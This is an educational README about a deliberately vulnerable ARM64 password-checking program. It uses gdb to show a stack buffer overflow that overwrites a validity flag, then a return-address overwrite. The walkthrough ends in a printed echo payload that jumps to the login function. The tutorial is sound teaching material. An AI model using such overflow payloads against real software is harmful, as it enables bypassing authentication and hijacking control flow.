# Buffer overflow example


This example program asks for user password and checks the validity of it by
comparing two strings.

If you enter the correct password (`pippo`), it will show some top secret
information. Otherwise, the application exits complaining for the wrong
password.


## Caveats

1. If you open the executable's dump file (`password.linked.dump`), the
   password is visible in the .rodata section

2. If you enter any 13 characters long password login is granted anyway... Can
   you guess why?



## Buffer overflow problem:

Run the application with gdb, put a breakpoint in `checkpassword()` and then
run the application:

```
(gdb) b checkpassword
(gdb) run
```

Now, we can ask gdb to show the local function variables (ie.  the ones stored
in the stack)

```
(gdb) info locals
valid = 0
user_password = "\260\372\377\377\377\377\000\000\354\005@"
```

Let's check the address of the two variables:

```
(gdb) p &valid
$1 = (unsigned int *) 0xfffffffffa9c
(gdb) p &user_password
$2 = (char (*)[12]) 0xfffffffffa90
```

`valid` is exactly 13 bytes after `user_password`! So, if we put more than 12
bytes into `user_password` we'll start to overwrite the memory location
referred by the `valid` variable. This makes sense because `valid` and
`user_password` are defined one after the other and therefore they are pushed in
the stack in the same order.

To fix the problem, we can modify `password.c` in this way:

From:
```
    if( strcmp( user_password, correct_password) == 0 )
        valid = 1;
```
To:
```
    if( strcmp( user_password, correct_password) == 0 )
        valid = 1;
    else
        valid = 0;
```

Now, even if the scanf overwrites the value of `valid`, it will later be
set to the correct value after the if statement.



## Is it really secure?


Since the `main()` function invokes other functions, the value of `x30` (LR)
must be stored somewhere. Indeed, if we disassemble the `main()`:

```
0000000000400378 <main>:
  400378:	f81f0ffe 	str	x30, [sp, #-16]!
  40037c:	97ffffe7 	bl	400318 <checkpassword>
  400380:	7100001f 	cmp	w0, #0x0
  400384:	54000080 	b.eq	400394 <main+0x1c>  // b.none
  400388:	97ffffdb 	bl	4002f4 <login_valid>
  40038c:	52800000 	mov	w0, #0x0                   	// #0
  400390:	14000005 	b	4003a4 <main+0x2c>
  400394:	d0000040 	adrp	x0, 40a000 <__extenddftf2+0x140>
  400398:	91216000 	add	x0, x0, #0x858
  40039c:	940000c0 	bl	40069c <puts>
  4003a0:	52800060 	mov	w0, #0x3                   	// #3
  4003a4:	f84107fe 	ldr	x30, [sp], #16
  4003a8:	d65f03c0 	ret
```


we see that the first instruction pushes the value of `x30` in the stack before
branching to `checkpassword()`. That value will be restored before returning
from the main. Since the main return address is pushed into the stack before
the `user_password` array, an overflow can potentially overwrite the address to
let it point to `login_valid()`.

Let's see the stack memory area using gdb:

```
(gdb) p &user_password
$1 = (char (*)[12]) 0xfffffffffa90
(gdb) p &valid
$2 = (unsigned int *) 0xfffffffffa9c
(gdb) x/48xb &user_password
0xfffffffffa90: 0xb0    0xfa    0xff    0xff    0xff    0xff    0x00    0x00
0xfffffffffa98: 0xf4    0x05    0x40    0x00    0x00    0x00    0x00    0x00
0xfffffffffaa0: 0x04    0x06    0x40    0x00    0x00    0x00    0x00    0x00
0xfffffffffaa8: 0xe8    0xfa    0xff    0xff    0xff    0xff    0x00    0x00
0xfffffffffab0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffffffffab8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
(gdb) 
```


In this example, `user_password` is located at `0xfffffffffa90`. 13 bytes after
that we have the address of `valid`, and then the return address of the `main()`
function at:

```
0xfffffffffaa0: 0x04    0x06    0x40    0x00    0x00    0x00    0x00    0x00
```

Indeed, if we disassemble at address `0x400604` (remember, it is a little-endian
architecture):

```
(gdb) disassemble 0x400604
Dump of assembler code for function libc_start_main_stage2:
   0x00000000004005cc <+0>:     stp     x29, x30, [sp, #-48]!
   0x00000000004005d0 <+4>:     mov     x29, sp
   0x00000000004005d4 <+8>:     stp     x21, x22, [sp, #32]
   0x00000000004005d8 <+12>:    add     x22, x2, w1, sxtw #3
   0x00000000004005dc <+16>:    mov     x21, x0
   0x00000000004005e0 <+20>:    add     x22, x22, #0x8
   0x00000000004005e4 <+24>:    stp     x19, x20, [sp, #16]
   0x00000000004005e8 <+28>:    mov     w19, w1
   0x00000000004005ec <+32>:    mov     x20, x2
   0x00000000004005f0 <+36>:    bl      0x40058c <libc_start_init>
   0x00000000004005f4 <+40>:    mov     x2, x22
   0x00000000004005f8 <+44>:    mov     x1, x20
   0x00000000004005fc <+48>:    mov     w0, w19
   0x0000000000400600 <+52>:    blr     x21
   0x0000000000400604 <+56>:    bl      0x400190 <exit>
End of assembler dump.
```


At `0x0000000000400604`  we have the bl to the `<exit>` function

The `login_valid()` funtion is located at:

```
(gdb) p login_valid
$3 = {void ()} 0x4002f4 <login_valid>
```

So, if we substitute 

```
0xfffffffffaa0: 0x04    0x06    0x40    0x00    0x00    0x00    0x00    0x00
```

with:

```
0xfffffffffaa0: 0xf4    0x02    0x40    0x00    0x00    0x00    0x00    0x00
```

at the address `0xfffffffffaa0` we should jump at the `login_valid()` function
when the `main()` returns.

To do so, we have to enter a password composed by 16 characters (does not
matter which ones) followed by the bytes `0xf4`, `0x02` and `0x40`. Since we
cannot insert those bytes with the keyboard, we'll use the echo command and
pipe the output to the `./password` standard input in this way:

```
echo -n -e "0000000000000000\\xf4\\x02\\x40" | ./password
```

the output should be something like:

```
Enter password:
Wrong password!
Login granted!
 Here are some top secret personal info:
 .....
```

